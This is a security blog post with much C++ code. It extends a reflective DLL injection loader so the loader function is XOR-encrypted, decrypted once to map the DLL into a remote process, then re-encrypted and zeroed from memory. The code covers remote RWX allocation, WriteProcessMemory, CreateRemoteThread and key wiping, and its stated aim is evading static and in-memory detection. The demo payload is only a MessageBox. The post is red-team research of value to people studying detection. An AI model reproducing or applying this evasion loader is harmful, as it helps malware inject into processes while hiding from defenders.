---
title: "YOLO: You Only Load Once"
date: 2024-01-18T16:04:14+01:00
draft: false
toc: false
images:
tags:
  - security
---

Ciao! back again for couple of extra thoughts about Reflective DLL Injection. If you did not read the first [post](https://oldboy21.github.io/posts/2023/12/all-i-want-for-christmas-is-reflective-dll-injection/), I might suggest you to give it a try before diving in here. What we talked about last time anyway was: 

- PE structure
- Reflective DLL Injection, why and how?
- Code breakdown

With this blog post I want to start this new series of “Security pills” where I can tell about some IT Sec adventures and hopefully cool stuff. The idea of these “Security pills” is to keep the topic relatively small and to share challenges, and solutions (and memes) 😊

In this specific case what is presented is pretty far from a final solution to a problem, this is more the result of an experiment with maybe some potential for future development. 

## The Trigger

While playing around with the Reflective DLL technique, mostly concerning how my very basic implementation behaved in terms of defence bypass and all, I have noticed that among the indicators of malicious activities there were the following: 

![Untitled](/yolo/Untitled.png)

Despite that is the result of a static analysis, that would leave indicators of compromise also in-memory, if it gets analysed. 

However, as I explained in the previous blog, those parsing/linking/loading operations are necessary in order for the Reflective DLL to work so it felt just like I could not do much about it. 

## The first thoughts

However, one random rainy night: 

![Untitled](/yolo/Untitled.jpeg)

The custom *GetProcAddress* and *GetModuleHandle* functions implemented for the Reflective DLL to be loaded are actually needed only **once** to carry out the **loading tasks**, after those tasks are achieved successfully, the DLL can live and operate happily without (unless of course you want to keep using them for reasons I am not going to address here). 

## The Idea and the first concerns

So my first idea was: “*ok, then I will encrypt them before writing the DLL into the remote process virtual space and decrypt only when I need them*”. That was the first and the only idea I had after all. Moreover, as per definition of “idea”, whether it is brilliant or not, it always comes with some implementation challenges: 

- Need another exported function that would decrypt the ReflectiveLoader and execute it
- I am not sure I know how to retrieve the size of the function in the compiled DLL. I can find the start but then I XOR everything till where?

The first point wasn’t actually a big issue, since implementing another function and exporting it is not a big deal. For what instead concerned the other point, at first glance I had no many solutions in mind to retrieve the exact range of addresses that would contain my reflective function but just a blurry idea similar to this ugly [draw.io](http://draw.io) 

 

![Untitled](/yolo/Untitled%201.png)

## First Challenges

Tried different (and dumb, *but you know you got to start from the bottom*) approaches at first, from the most basic and optimistic idea that functions would be compiled in the same order as they appear in the .cpp file and that the beginning of a function would exactly be one byte after the end of the previous one. None of them were true so the idea of using dummy functions around the ReflectiveLoader to identify its boundaries quickly faded. 

Another little eureka was to instead use assembly instruction to hardcode an “egg” at the end of the ReflectiveFunction, so that the SupportFunction will know where to start and where to end with the encryption task. 

Something like this: 

```cpp
  DB 61h                ; "a"
  DB 69h                ; "i"
  DB 75h                ; "u"
  DB 74h                ; "t"
  DB 6Fh                ; "o"
  DB 6Fh                ; "o"
  ret
```

I must admit I haven’t tried this because I got distracted by many other things, but I think it would have worked. 

![Untitled](/yolo/Untitled%201.jpeg)

## The Solution (on paper)

Between masterchef and the latest idea I had, I also started to work on other IT related stuff, and while I was randomly looking at the procedure of [stack unwinding](https://stackoverflow.com/questions/2331316/what-is-stack-unwinding) I have realized that within the PE file there is a directory that contains exactly **what I was looking for** 😮:

![Untitled](/yolo/Untitled%202.png)

Basically within the PE (in the the IMAGE_DIRECTORY_ENTRY_EXCEPTION) are saved **the RVAs of the begin and the end of each functions**. And if you wonder why, the reason is that with that information, it’s easy for the OS to determine in what function an exception has been encountered and what stack frame has to be *unwinded* 👀 

I won’t talk much about this since I do not feel like mastering the concept yet, but after a couple of extra checks I could confirm those RVAs were what I needed. 

Those information we see in the [PEBear](https://github.com/hasherezade/pe-bear) image can be retrieved using the [RUNTIME_FUNCTION](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-runtime_function) structure. 

```cpp
typedef struct _IMAGE_RUNTIME_FUNCTION_ENTRY {
  DWORD BeginAddress;
  DWORD EndAddress;
  union {
    DWORD UnwindInfoAddress;
    DWORD UnwindData;
  } DUMMYUNIONNAME;
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION, _IMAGE_RUNTIME_FUNCTION_ENTRY, *_PIMAGE_RUNTIME_FUNCTION_ENTRY;
```

Very bello, so how do we actually implement the logic of the **YOLO Loader?** 

1. Loader download/read from file the Reflective DLL 
2. Parses the DLL raw bytes in order to find the RRAs (Relative Raw Address, naming convention I have used in this blog post) of the ReflectiveFunction begin and end, and the RRA of the SupportLoader
3. Encrypt the bytes contained between the ReflectiveFunction *begin* and *end* address 
4. Write the Reflective DLL into the remote process and invoke the SupportLoader
5. The SupportLoader decrypt and invoke the ReflectiveFunction
6. The ReflectiveFunction does its magic and invoke again the SupportLoader to be encrypted and sleep forever

Super, 6 points to the success 🥂. 

Still something was missing tho, since the SupportLoader function in the remote process **must know** the **key to decrypt the content of the ReflectiveLoader** and also **the size in bytes of the ReflectiveLoader function.** The whole idea of this code is to keep the PE parsing/loading tasks fully encryptable, therefore we do not want to ask the SupportLoader to look those up itself within the PE Exception directory. 

![https://media3.giphy.com/media/rdAeOA3mfXomQ/giphy.gif?cid=7941fdc6mlxfzf5jcq6co9aha90y84sfmetdgaczd2bfk31m&ep=v1_gifs_search&rid=giphy.gif&ct=g](https://media3.giphy.com/media/rdAeOA3mfXomQ/giphy.gif?cid=7941fdc6mlxfzf5jcq6co9aha90y84sfmetdgaczd2bfk31m&ep=v1_gifs_search&rid=giphy.gif&ct=g)

Let’s take a step back, in the last [code](https://github.com/oldboy21/RflDllOb/blob/main/ReflectiveDLL/dllmain.cpp) I have published as support to my blog post, I had defined a structure that would carry some information in the remote process where we want to execute the Reflective DLL. 

```cpp
typedef struct _DLL_HEADER {
    DWORD header; //to find the DLL in memory
    CHAR key; //idea was floating in my mind already back then
} DLL_HEADER, * PDLL_HEADER;
```

Given this new requirements, I have decided to still use this structure to carry the needed information for the YOLO loader to work, and a slightly bigger encryption key: 

```cpp
typedef struct _DLL_HEADER {
    DWORD header; //4 bytes header
    DWORD key; //4 bytes encryption key
    SIZE_T ReflectiveLoaderfuncSize; //8 bytes
} DLL_HEADER, * PDLL_HEADER;
```

Let’s stop ranting about ideas and dive into the real code. 

## The Code

Alright, now that the idea is pretty much defined let’s take a look at the code. 

### ReflectiveDLLInjector

Starting from the first [ReflectiveDLLInjector](https://github.com/oldboy21/RflDllOb/tree/main/ReflectiveDLLInjector) what’s new is: 

```cpp
//function that finds the End address of a given function
PBYTE findFunctionEnd(PBYTE dllBase, PBYTE loaderAddressRaw) {

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(dllBase + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }
    IMAGE_FILE_HEADER fileHeader = pNtHeader->FileHeader;
    IMAGE_OPTIONAL_HEADER optionalHeader = pNtHeader->OptionalHeader;
    vector<PIMAGE_SECTION_HEADER> peSections;
    for (int i = 0; i < fileHeader.NumberOfSections; i++) {
        //starting from the pointer to NT header + 4(signature) + 20(file header) + size of optional = pointer to first section header. 
        // to get to the next i multiply the index running through the number of sections multiplied by the size of section header 
        peSections.insert(peSections.begin(), (PIMAGE_SECTION_HEADER)(((PBYTE)pNtHeader) + 4 + 20 + fileHeader.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER)));
    }
    PRUNTIME_FUNCTION pRuntimeFunction = (PRUNTIME_FUNCTION)(dllBase + Rva2Raw(optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress, peSections, (int)fileHeader.NumberOfSections));
    for (DWORD i = 0; i < optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION); ++i) {
        // Access the fields of each RUNTIME_FUNCTION structure
        if ((LPVOID)Rva2Raw(pRuntimeFunction[i].BeginAddress, peSections, (int)fileHeader.NumberOfSections) == loaderAddressRaw) {
            //return the end address of the function that matches the beginaddress of the ReflectiveLoader
            return (PBYTE) Rva2Raw((pRuntimeFunction[i].EndAddress-1), peSections, (int)fileHeader.NumberOfSections);
        }
    }
    return 0;
}
```

The function above helps finding the **end RVA** of a function, given its begin 🙂 pretty straightforward and it does that parsing the entries of the IMAGE_DIRECTORY_ENTRY_EXCEPTION directory. 

Since the Exception directory does not keep the name of the function but only its begin and end, in order to find the one I was interested in, I have compared the begin address in the Exception table with the address of the ReflectiveLoader retrieved from the Export directory. 

Now it is possible to compute the actually size of the function: 

```cpp
/*--------CALCULATE THE OFFSET OF THE REFLECTIVE FUNCTION--------*/

PBYTE reflectiveLoaderFunc = (PBYTE)RetrieveFunctionRawPointer(pebase, EXPORTED_FUNC_NAME);
if (reflectiveLoaderFunc == NULL) {
    cout << "[-] Error while retrieving the RAW offset of the ReflectiveLoader function\n";
    return 1;
}
printf("[+] ReflectiveLoader function found at relative raw address: %p\n", reflectiveLoaderFunc);

/*------------FINDING FUNCTION SIZE FOR ENCRYPTION-----------------*/

PBYTE reflectiveLoaderFuncEnd = findFunctionEnd(pebase, reflectiveLoaderFunc);
SIZE_T rfSize = (reflectiveLoaderFuncEnd - reflectiveLoaderFunc);
printf("[+] Size of Reflective Function (bytes): %lu\n", rfSize);
```

Using a simple XOR function now it is possible to encrypt the bytes between *BeginAddress* and *EndAddress*. 

Little attention also at the function that writes the DLL in the remote process and the function that  place our HEADER before the PE: 

```cpp
PBYTE InjectDllRemoteProcess(int pid, size_t dllSize, PBYTE dllBuffer, HANDLE hProc, size_t funcSize) { 
    size_t bytesWritten = 0;
    //zoom in into this one in the next code block
    PBYTE dllBufferFinal = (PBYTE)addHeaderToBuffer(dllBuffer, dllSize, funcSize);
    PBYTE dllDestination = (PBYTE)VirtualAllocEx(hProc, NULL, dllSize + DLL_HEADER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (dllDestination == NULL) {
        cout << "[-] Error while allocating memory in remote process, exiting ... " << endl;
        return NULL;
    }
    //everything will be shifted by DLL_HEADER_SIZE (16 bytes)
    if (WriteProcessMemory(hProc, dllDestination, dllBufferFinal, dllSize + DLL_HEADER_SIZE, &bytesWritten))
    {
        printf("[+] Successfully wrote DLL bytes + header at remote address: %p\n", dllDestination);
    }
    else {
        cout << "[-] Error while writing the DLL in the remote process, exiting ... " << endl;
        cerr << "[-] Win32 API Error: " + GetLastError() << endl;
        return NULL;
    }
    return dllDestination;
}
```

```cpp
char * addHeaderToBuffer(PBYTE dll, size_t dllSize, size_t funcSize) {

    //I create a new buffer big as the dll + header
    char* newDll = new char[dllSize + DLL_HEADER_SIZE];
    //i write the dll HEADER_SIZE bytes forward so that i have the space for the header
    memmove(newDll + DLL_HEADER_SIZE, dll, dllSize);
    //write the header bytes
    memcpy(newDll, HEADER, HEADER_SIZE);
    //write the key bytes
    memcpy(newDll + HEADER_SIZE, KEY, KEY_SIZE);
    //write the size of the reflectivefunction
    memcpy(newDll + HEADER_SIZE + KEY_SIZE, &funcSize, sizeof(SIZE_T));
    return newDll;
}
```

That’s pretty much it for the ReflectiveDLLInjector code news 🙂 

![https://media0.giphy.com/media/0EffMm7e0SHSCBxFzo/giphy.gif?cid=7941fdc6f9wdia6dok9ahejeqrlvqyqq1d276pddtn3yictn&ep=v1_gifs_search&rid=giphy.gif&ct=g](https://media0.giphy.com/media/0EffMm7e0SHSCBxFzo/giphy.gif?cid=7941fdc6f9wdia6dok9ahejeqrlvqyqq1d276pddtn3yictn&ep=v1_gifs_search&rid=giphy.gif&ct=g)

one little last thing, the idea now of course it’s to invoke the *SupportLoader* function instead of the *ReflectiveLoader* (which will be encrypted in the remote process). 

```cpp
hThread = CreateRemoteThread(hProc,NULL, 0, (LPTHREAD_START_ROUTINE)(remotePEBase + (DWORD)reflectiveSupportLoaderFunc + DLL_HEADER_SIZE), NULL, 0 , &threadId);
if (hThread == NULL) {
    cout << "[-] Error while running the remote thread, exiting ... \n";
}
else {
    printf("[+] Successufully ran thread with id: %lu\n", threadId);
}
```

### ReflectiveDLL

Let’s start from what’s the most important player of the YOLO loader, the SupportLoader function 😀 (most of the new lines are explained in the comments)

```cpp
EXTERN_DLL_EXPORT bool SupportLoader() {
    
    fnDllMain pDllMain = NULL;
    PBYTE pebase = NULL;
    PIMAGE_DOS_HEADER pImgDosHdr = NULL;
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;
    PDLL_HEADER pDllHeader = NULL;
    ULONG_PTR dllBaseAddress = NULL;
    dllBaseAddress = (ULONG_PTR)CrazyLoader;
   
    //walking backwards to find the Header which contains juicy informations
    while (TRUE)
    {
        pDllHeader = (PDLL_HEADER)dllBaseAddress;

        if (pDllHeader->header == 0x44434241) {
            //i can modify these checks, **so i will get rid of the signatures comparison**
            //thinking of some checksum checks, for **now** this
            pImgDosHdr = (PIMAGE_DOS_HEADER)(dllBaseAddress + (16 * sizeof(CHAR)));
            if (pImgDosHdr->e_magic == IMAGE_DOS_SIGNATURE)
            {
                pImgNtHdrs = (PIMAGE_NT_HEADERS)(dllBaseAddress + pImgDosHdr->e_lfanew + (16 * sizeof(CHAR)));

                if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE) {
                    break;
                }
            }
        }
        dllBaseAddress--;
    }

    if (!dllBaseAddress)
        return FALSE;
   
    //retrieve the information to decrypt the loader, they are actually all in the struct already
    //decrypt the loader 
    PBYTE reflectiveAddr = NULL;
    //retrieve the key from memory
    //shifting bytes to extract the SIZE_T
    BYTE KEY[4] = { (BYTE)(pDllHeader->key & 0xFF), (BYTE)((pDllHeader->key >> 8) & 0xFF), (BYTE)((pDllHeader->key >> 16) & 0xFF), (BYTE)((pDllHeader->key >> 24) & 0xFF) };
    reflectiveAddr = (PBYTE)ReflectiveFunction;
    //decrypt the content of the ReflectiveFunction
    for (size_t i = 0, j = 0; i < (pDllHeader->funcSize); i++, j++) {
        if (j >= sizeof(pDllHeader->key)) {
            j = 0;
        }
        reflectiveAddr[i] = reflectiveAddr[i] ^ KEY[j];
    }
    //execute the loading tasks
    **pebase = ReflectiveFunction(pDllHeader->funcSize);**
    //re-encrypting the reflective function 
    for (size_t i = 0, j = 0; i < (pDllHeader->funcSize); i++, j++) {
        if (j >= sizeof(pDllHeader->key)) {
            j = 0;
        }
        reflectiveAddr[i] = reflectiveAddr[i] ^ KEY[j];
    }
    //before going to main we want to zero-out also the encryption key
    pDllHeader->key = 0x0;
    //and the GPARO GMHO
    //but not in this blog post :) 
    pDllMain = (fnDllMain)(pebase + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
    return pDllMain((HMODULE)pebase, DLL_PROCESS_ATTACH, NULL);
   
}
```

Not much changed for what it concerns the actual reflective loader function comparing to what I have shared [here](https://github.com/oldboy21/RflDllOb/blob/afcd90b29d7797645dde7d963333a58e973fb5c0/ReflectiveDLL/dllmain.cpp#L614C4-L614C4). 

Main difference now is that the ReflectiveLoader returns **the base address where the DLL has been loaded so that the SupportLoader function can put ReflectiveLoader to sleep and execute the DLL main** 🙂

Bello, almost done. One important thing that I was almost about to forget is that the DLL copies itself into memory again as explained [here](https://oldboy21.github.io/posts/2023/12/all-i-want-for-christmas-is-reflective-dll-injection/) during the loading process. 

It has to respect the compiler instructions when it comes to sections being mapped in memory. And we know that at that point the ReflectiveLoader function is actually decrypted (because being executed) therefore copied in memory again. A way I found to prevent this is to modify the **custom_memcpy** I have written for the previous loader so that when the source bytes are from within the range of the ReflectiveLoader function, it only copies 0x0 bytes.  

```cpp
void* custom_memcpy(void* pDestination, void* pSource, size_t sLength, PBYTE toZero, SIZE_T lentgh) {

    PBYTE D = (PBYTE)pDestination;
    PBYTE S = (PBYTE)pSource;
    while (sLength--) {
    //if the source is within the range of the ReflectiveLoader function
    //it will just write 0-bytes
        if (S > toZero && S < (toZero + (DWORD)lentgh)) 
        {
            *D++ = 0x0;
        }
        else {
            *D++ = *S++;
        }
    }
    return pDestination;
}
```

## Demo Time!

Ok but what about the MessageBox popping up?

![Classic Messagebox invoking the SupportLoader instead](/yolo/Untitled%203.png)

Classic Messagebox invoking the SupportLoader instead

![ReflectiveLoader zero-ed out in the loaded image](/yolo/Untitled%204.png)

ReflectiveLoader zero-ed out in the loaded image

![Zero-ed out encryption key](/yolo/Untitled%205.png)

Zero-ed out encryption key

## Conclusions and Future developments

In the end the experiment was successful, managed to inject into a remote process a reflective DLL with an encrypted ReflectiveLoader function that would Reflectively load the DLL once decrypted and then disappear forever. That is done by parsing the entries of the Exception directory and identifying the exact range in memory that holds the ReflectiveLoader function. Still: 

- Custom GetProcAddress and GetModuleHandle in the code above were not part of the encryption process. I know, solution is probably to export them as well so I have a reference to their start and then repeating what I have done already for the reflective function
- While walking towards our beloved Koning the visspecialist with bomber [Cas](https://twitter.com/chvancooten) we were thinking how better would be to not encrypt the ReflectiveLoader function but mask it as another legit function. I gave that a thought and I think that the commutative and associative properties of the XOR function can be used for that. In fact A (ReflectiveLoader) ^ B (LegitFunction) = C ( Sequence of Bytes) → B (LegitFunction) ^ C (Sequence of Bytes) = A (ReflectiveLoader).
- With little more attention and thinking about the DLL HEADER it’s possible to get rid of the PE signature checks in memory, made a note about that in the comments but haven’t implemented that yet.
- Main take away here I think it’s the fact you can mask single function of a DLL